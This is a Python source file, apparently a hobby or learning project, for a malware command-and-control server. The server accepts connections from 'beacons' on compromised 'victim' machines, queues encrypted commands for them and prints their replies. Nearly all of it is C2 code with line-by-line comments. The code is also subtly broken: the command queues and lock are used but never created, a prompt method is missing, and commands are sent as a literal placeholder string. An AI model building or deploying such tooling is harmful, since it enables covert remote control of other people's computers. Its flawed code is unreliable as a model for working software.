import socket 
import threading 
import json
import time
from encrypt import EncryptedCommunicator

class C2Server:
    #This init is in charge of setting up the network configuarations
    # host='0.0.0.0' means to listen on any and all network interfaces 
    # port=8080 is just the specific network port to listen on
    # active_session is the dict to track all connected victums
    # session counter just gives each beacon an ID    
    def __init__(self, host='0.0.0.0', port=8080, password='Mr.Robot'): 
        self.host = host 
        self.port = port
        self.password = password
        self.active_sessions = {}
        self.session_counter = 0

        self.encryptor = EncryptedCommunicator(password) # This is pretty much creating the encryption engine that we will use to encrypt data in the this server code

        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates a new socket, IPV4, TCP
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1) #sets the options, the option that is being set is SO_REUSEADDR 
                                                                              #so that we can reconnect to the same local address after the server stops.

    def start_server(self):
        server_thread = threading.Thread(target=self._run_server) #creating a thread and assinging it to run "_run_server" (NOT STARTING IT YET)
        server_thread.daemon = True #kills the thread once main program exits
        server_thread.start()  #starts that thread therefore starting the server
        return server_thread  #allows this thread to be used by other functions if needed 

    def _run_server(self):
        try:
            self.server_sock.bind((self.host, self.port)) #this is claiming the IP address and port of our server which we set up earlier
            self.server_sock.listen(5) #this allows for up to 5 beacons to wait in line while the server is busy
            print(f"C2 Server is listenting on {self.host}:{self.port}")
            print(f"waiting for beacon the beacon to connect......")

            while True: #this is acting as a beacon connection acceptor
                client_socket, client_address = self.server_sock.accept() #when a connection is accepted, this is getting a new socket object (client_socket) and IP/port (client_address) that is dedicated to that newley connected beacon
                                                                            #the accept is waiting indefinitely for a new connection  
                print(f"New beacon connection from {client_address}") 

                client_thread = threading.Thread( #creates a parallel thread, like opening a new tab in browser
                    target=self.handle_beacon, #this is running the handle_beacon function inside of the new thread 
                    args=(client_socket, client_address) #giving handle_beacon the beacons address and socket
                )
                client_thread.daemon = True #daemon thread, it will die if the main thread (server) exits
                client_thread.start() #begins running this new thread

        except Exception as e: #saftey net for any error in the try block, exeption types are stored in e, I just don't want python tracebacks
            print(f"Server error: {e}")

    def handle_beacon(self, client_socket, client_address): # given the client_socket and client_address which was gotten from the .accept tuple in start_server()
        session_id = self.session_counter # takes the current value of the counter (starts 0) and assigns it to session_id
        self.session_counter += 1 # inc counter so next beacon connection gets a new ID

        self.active_sessions[session_id] = {      #storing initial beacon info
            'socket': client_socket,
            'address': client_address,
            'connected_at': time.time(),  #timestamp of when the beacon connected
            'last_seen': time.time()
        }
        self.command_queues[session_id] = [] #initializes the command queue for when a beacons connects it can have a fresh command queue 
        print(f"Beacon: {session_id} , Registered from: {client_address}")

        try:

            while True:
                if self.command_queues[session_id]: #if there are any pending commands for this SPECIFIC beacon... 
                    next_command = self.command_queues[session_id].pop(0) # pop the most recent command from the queue... 
                    encrypted_command = self.encryptor.EncryptMessage(next_command) #encrypt the command...
                    client_socket.send(encrypted_command) #send the encrypted command from the server to the beacon



                    encrypted_data = client_socket.recv(4096)  #thread will pause and wait here until the beacon sends data, stores the raw bytes into encrypted_data (max 4096 bytes) 

                    if not encrypted_data:  #if recv() gives an empty result, happens when the beacon closes the socket, sends a FIN
                        break  #exit loop
                    
                    beacon_data = self.encryptor.DecryptMessage(encrypted_data) #this is taking the encryption engine we defined at the top and using the .decrypt_message to decrypt the data coming in from the beacon
                    
                    print(f"\n[Beacon {session_id} Response] ---> {beacon_data}")
                
                    self.show_prompt() #this is showing the command prompt to the screen 

                else:  #runs if there are no command waiting for the beacon 
                    
                    client_socket.settimeout(2.0)  #timeout after 2 secs if no data arrives
                    try:
                        encrypted_data = client_socket.recv(1024)  #tries to recieve any data the beacon may have sent, waits 2 seconds
                        if encrypted_data:   #checks if beacon has actually sent anything
                            beacon_data = self.encryptor.DecryptMessage(encrypted_data) #decrypts whatever it is
                            if beacon_data.get('type') == 'checkin':  #Checks if its a keep alive
                                self.update_beacon_status(session_id)    #updates the last seen to the last time it was known to be alive
                            else:
                                print(f"\n[Beacon {session_id} Unexpected] ----> {beacon_data}\n")  
                                self.show_prompt()   #shows the C2 command prompt again
                    except socket.timeout:  #catches the 2 sec timeout, means beacon didnt send anything
                        continue  #goes back to main loop to check for commands
                    except:  #catches any other error, (beacon disconnecting potentially)
                        break

        except Exception as e: #catches any error that happens in the beacon handling loop 
            print(f"Beacon {session_id} error: {e}") #shows that error 
        finally:   #this finally block is in charge of clean up after a beacon disconnnects 
            client_socket.close() #closes the network connection to that beacon and free's up the port 
            with self.lock:   #thread lock while doing clean up to prevent race condintions and data corruption
                if session_id in self.active_sessions:  #checking the session is in the session tracking dict
                    del self.active_sessions[session_id]  #removes that beacon from the list
                if session_id in self.command_queues: #if the beacon has a command queue
                    del self.command_queues[session_id]  # clean up any pending commands for that beacon
            print(f"Beacon {session_id} disconnnected") 


    def update_beacon_status(self, session_id):
        with self.lock:  #hold thread lock so that other threads don't interfere in this process 
            if session_id in self.active_sessions:  #just making sure the beacon is in the list 
                self.active_sessions[session_id]['last_seen'] = time.time()  #update the last beacons last seen timestamp

    
    def list_sessions(self):
        with self.lock: #locks session data to prevent changes while we are reading from it 
            if not self.active_sessions:  #making sure there are active sessions going
                print("No active sessions")
                return #stop the method here, no point to continue
            
            print("\n======CURRENT ACTIVE BEACONS======")
            for session_id, session_info in self.active_sessions.items():  #this does tuple unpacking, .items() gives us both the Key AND values from the dictionary and then
                                                                           # for session_id, session_info automatically unpacks them into seperate variables, example: First iteration: session_id = 0, session_info = {'socket': ..., 'address': ...}
                duration = time.time() - session_info['connected_at'] #calculating how long this session has been active, current time - when it connected 
                print(f"Session {session_id}: {session_info['address']} (connected: {duration:.0f}s ago)") #shows beacon ID, IP and port, and the duration rounded to the nearest second
                print() #blank line 

    def send_command(self, session_id, command):   #command is the actual command string, Ex: "whoami", "ls" 
        with self.lock:   #locks session data to prevent changes while we are reading from it 
            if session_id not in self.active_sessions: #checking if the beacon has disconnected since the operator typed the command 
                print(f"Session {session_id} not found") 
                return False  #command failed
            
            command_data={     #creates a dictionary that the beacon will understand 
                "type": "command",
                "command": "command",
                "timestamp": time.time()
            }

            self.command_queues[session_id].append(command_data)   #accesses the command list for the specific beacon then "appends" the command dictionary to the end of the list
            print("f Command queued for beacon {session_id}: {command}")
            return True   #command was successful


        #finally:
         #   client_socket.close()
          #  if session_id in self.active_sessions: 
           #     del self.active_sessions[session_id]  #removes beacon from tracking list 
            #print(f" Beacon {session_id} disconnected


